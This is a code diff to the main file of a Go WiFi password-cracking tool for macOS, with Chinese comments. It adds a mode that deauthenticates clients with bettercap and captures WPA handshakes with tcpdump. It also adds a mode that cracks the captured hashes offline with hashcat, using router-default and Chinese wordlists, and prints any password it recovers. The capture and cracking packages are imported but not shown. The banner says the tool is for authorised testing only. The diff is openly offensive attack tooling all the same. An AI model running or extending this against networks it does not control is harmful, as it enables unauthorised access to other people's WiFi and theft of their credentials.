@@ -6,8 +6,10 @@ import (
 	"os"
 	"path/filepath"
 	"time"
+	"wifi-crack/internal/capture"
 	"wifi-crack/internal/cracker"
 	"wifi-crack/internal/dict"
+	"wifi-crack/internal/hashcrack"
 	"wifi-crack/internal/masterkey"
 	"wifi-crack/internal/scanner"
 )
@@ -16,13 +18,13 @@ import (
 // 版本信息
 // ============================================================
 const (
-	version = "2.0.0"
+	version = "3.0.0"
 	banner  = `
-  ╔══════════════════════════════════════════════╗
-  ║   WiFi Cracker v%s (Go + CoreWLAN)        ║
-  ║   万能钥匙预查 + 智能字典爆破              ║
-  ║   macOS 专用 · 仅限授权安全测试            ║
-  ╚══════════════════════════════════════════════╝
+  ╔══════════════════════════════════════════════════╗
+  ║   WiFi Cracker v%s (Go + CoreWLAN + hashcat)  ║
+  ║   万能钥匙 + 握手包捕获 + GPU离线破解          ║
+  ║   macOS 专用 · 仅限授权安全测试                ║
+  ╚══════════════════════════════════════════════════╝
 `
 )
 
@@ -34,6 +36,10 @@ func main() {
 	dictFile := flag.String("d", "", "额外字典文件路径")
 	delay := flag.Int("delay", 200, "每次尝试间隔（毫秒）")
 	scanOnly := flag.Bool("scan", false, "仅扫描，不爆破")
+	captureMode := flag.Bool("capture", false, "握手包捕获模式（tcpdump+bettercap）")
+	hashcatMode := flag.Bool("hashcat", false, "hashcat GPU离线破解模式")
+	hashFile := flag.String("hash", "", "hashcat哈希文件路径（.22000格式，配合--hashcat使用）")
+	maskOnly := flag.Bool("mask", false, "仅执行掩码暴力攻击（配合--hashcat使用）")
 	verbose := flag.Bool("v", true, "显示详细日志")
 	showVersion := flag.Bool("version", false, "显示版本")
 	flag.Parse()
@@ -45,6 +51,14 @@ func main() {
 	}
 
 	fmt.Printf(banner, version)
+
+	// ============================================================
+	// 独立模式：hashcat离线破解（提供了--hash文件时直接破解）
+	// ============================================================
+	if *hashcatMode && *hashFile != "" {
+		runHashcatOnly(*hashFile, *dictFile, *maskOnly, *verbose)
+		return
+	}
 
 	// ============================================================
 	// 阶段0：位置权限检查
@@ -121,6 +135,15 @@ func main() {
 	// 仅扫描模式到此结束
 	if *scanOnly {
 		fmt.Println("\n  [*] 扫描完成（--scan 模式，不执行爆破）")
+		return
+	}
+
+	// ============================================================
+	// 握手包捕获模式（--capture）
+	// 流程: 断WiFi → tcpdump监控 → bettercap deauth → 捕获握手 → 转hashcat → GPU破解
+	// ============================================================
+	if *captureMode {
+		runCaptureMode(targets, allPasswordsForTargets(targets, *dictFile), *verbose)
 		return
 	}
 
@@ -263,4 +286,200 @@ func truncStr(s string, maxLen int) string {
 		return s
 	}
 	return string(runes[:maxLen-1]) + "…"
+}
+
+// ============================================================
+// allPasswordsForTargets 为目标构建完整密码列表
+// 用于capture模式中hashcat的字典来源
+// ============================================================
+func allPasswordsForTargets(targets []scanner.WiFiNetwork, dictFile string) []string {
+	var all []string
+
+	// 路由器默认密码
+	for _, t := range targets {
+		all = append(all, cracker.GenerateRouterDefaults(t.SSID)...)
+	}
+
+	// 中国定制字典
+	all = append(all, dict.GenerateAllChinese()...)
+
+	// 外部字典
+	if dictFile != "" {
+		absPath, _ := filepath.Abs(dictFile)
+		extra, err := dict.LoadDictFile(absPath)
+		if err == nil {
+			all = append(all, extra...)
+		}
+	}
+
+	return dict.MergeAndDedup(all)
+}
+
+// ============================================================
+// runCaptureMode 握手包捕获+hashcat GPU离线破解模式
+// 流程: 检测工具 → 捕获握手包 → hashcat GPU破解
+// ============================================================
+func runCaptureMode(targets []scanner.WiFiNetwork, passwords []string, verbose bool) {
+	fmt.Println("\n  ══ 握手包捕获 + GPU离线破解模式 ══")
+
+	// 检查所需工具
+	missing := capture.CheckTools()
+	if len(missing) > 0 {
+		fmt.Println("  [!] 缺少以下工具:")
+		for _, m := range missing {
+			fmt.Printf("      - %s\n", m)
+		}
+		fmt.Println("  [!] 请先安装后再使用此模式")
+		os.Exit(1)
+	}
+
+	// 检查hashcat
+	ok, info := hashcrack.CheckHashcat()
+	if !ok {
+		fmt.Printf("  [!] %s\n", info)
+		os.Exit(1)
+	}
+	fmt.Printf("  [+] %s\n", info)
+
+	// hashcat基准测试
+	speed, err := hashcrack.Benchmark()
+	if err == nil && speed > 0 {
+		fmt.Printf("  [+] GPU基准速度: %d H/s\n", speed)
+	}
+
+	// 记录原始WiFi用于恢复
+	originalSSID := scanner.CurrentSSID()
+	if originalSSID != "" {
+		fmt.Printf("  [!] 当前WiFi: %s（完成后自动恢复）\n", originalSSID)
+	}
+
+	cfg := capture.DefaultCaptureConfig()
+	cfg.Verbose = verbose
+
+	successCount := 0
+	for i, t := range targets {
+		fmt.Printf("\n  ── 目标 [%d/%d] %s (BSSID:%s CH:%d 信号:%d) ──\n",
+			i+1, len(targets), t.SSID, t.BSSID, t.Channel, t.RSSI)
+
+		if t.BSSID == "" {
+			fmt.Println("    [!] BSSID为空，跳过")
+			continue
+		}
+
+		// 捕获握手包
+		result := capture.CaptureHandshake(t.SSID, t.BSSID, t.Channel, cfg)
+		if !result.Success {
+			fmt.Printf("    [!] 捕获失败: %s\n", result.Error)
+			continue
+		}
+
+		fmt.Printf("    [+] 捕获成功（耗时%s），开始hashcat GPU破解...\n",
+			result.Duration.Round(time.Second))
+
+		// 生成临时字典文件
+		wordlistPath, wErr := hashcrack.GenerateWordlist(passwords, cfg.OutputDir)
+		if wErr != nil {
+			fmt.Printf("    [!] 字典文件生成失败: %v\n", wErr)
+			continue
+		}
+
+		// 执行hashcat破解
+		hcfg := hashcrack.DefaultHashcatConfig()
+		hcfg.HashFile = result.HashFile
+		hcfg.Wordlists = []string{wordlistPath}
+		hcfg.Verbose = verbose
+
+		hResult := hashcrack.CrackAll(hcfg)
+		if hResult.Success {
+			successCount++
+			fmt.Printf("\n  ✓✓✓ 破解成功! SSID=%s 密码=%s（%s, 耗时%s）\n",
+				t.SSID, hResult.Password, hResult.Attack,
+				hResult.Duration.Round(time.Second))
+		} else {
+			fmt.Printf("    [!] GPU破解未命中（%s）\n", hResult.Error)
+		}
+	}
+
+	// 恢复原始WiFi
+	if originalSSID != "" {
+		fmt.Printf("\n  [*] 正在恢复原WiFi: %s ...", originalSSID)
+		if scanner.ReconnectWiFi(originalSSID) {
+			fmt.Println(" ✓ 已恢复")
+		} else {
+			fmt.Println(" ✗ 恢复失败，请手动连接")
+		}
+	}
+
+	// 结果汇总
+	fmt.Printf("\n  ══ 完成: 共%d个目标，GPU破解成功%d个 ══\n", len(targets), successCount)
+	if successCount > 0 {
+		os.Exit(0)
+	} else {
+		os.Exit(1)
+	}
+}
+
+// ============================================================
+// runHashcatOnly 独立hashcat破解模式
+// 直接对提供的.22000哈希文件执行GPU破解
+// ============================================================
+func runHashcatOnly(hashFilePath, dictFilePath string, maskOnly, verbose bool) {
+	fmt.Println("\n  ══ hashcat GPU独立破解模式 ══")
+
+	// 检查hashcat
+	ok, info := hashcrack.CheckHashcat()
+	if !ok {
+		fmt.Printf("  [!] %s\n", info)
+		os.Exit(1)
+	}
+	fmt.Printf("  [+] %s\n", info)
+
+	// 检查哈希文件
+	if _, err := os.Stat(hashFilePath); err != nil {
+		fmt.Printf("  [!] 哈希文件不存在: %s\n", hashFilePath)
+		os.Exit(1)
+	}
+
+	cfg := hashcrack.DefaultHashcatConfig()
+	cfg.HashFile = hashFilePath
+	cfg.Verbose = verbose
+
+	// 构建字典列表
+	if !maskOnly {
+		var wordlists []string
+
+		// 用户指定的字典
+		if dictFilePath != "" {
+			absPath, _ := filepath.Abs(dictFilePath)
+			wordlists = append(wordlists, absPath)
+		}
+
+		// 生成内置字典临时文件
+		builtinPwds := dict.GenerateAllChinese()
+		tmpDir := filepath.Dir(hashFilePath)
+		if tmpPath, err := hashcrack.GenerateWordlist(builtinPwds, tmpDir); err == nil {
+			wordlists = append(wordlists, tmpPath)
+		}
+
+		// 检查本地wifi_dict.txt
+		exeDir, _ := os.Getwd()
+		localDict := filepath.Join(exeDir, "wifi_dict.txt")
+		if _, err := os.Stat(localDict); err == nil {
+			wordlists = append(wordlists, localDict)
+		}
+
+		cfg.Wordlists = wordlists
+	}
+
+	// 执行破解
+	result := hashcrack.CrackAll(cfg)
+	if result.Success {
+		fmt.Printf("\n  ✓✓✓ 破解成功! 密码=%s（%s, 耗时%s）\n",
+			result.Password, result.Attack,
+			result.Duration.Round(time.Second))
+		os.Exit(0)
+	} else {
+		fmt.Printf("\n  [!] GPU破解未命中（%s）\n", result.Error)
+		os.Exit(1)
+	}
 }
